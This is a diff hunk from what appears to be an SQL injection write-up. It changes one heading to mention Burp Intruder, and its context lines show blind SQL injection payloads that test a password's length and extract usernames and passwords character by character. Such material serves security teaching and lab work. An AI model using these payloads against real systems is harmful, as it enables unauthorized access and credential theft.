@@ -48,7 +48,7 @@ III. Exploitation
    
     Payload5: ' OR LENGTH(password)=5# // Enums length of password
     ~~~
-    **Enumerating the user/pass:**
+    **Enumerating the user/pass using Burp Intruder:**
     ~~~
     Payload6:' OR (SELECT CASE WHEN SUBSTRING(username,§1§,1)='§a§' THEN 1=1 ELSE 1=2 END)#//
     Payload7:' OR (SELECT CASE WHEN SUBSTRING(password,§1§,1)='§a§' THEN 1=1 ELSE 1=2 END)#//
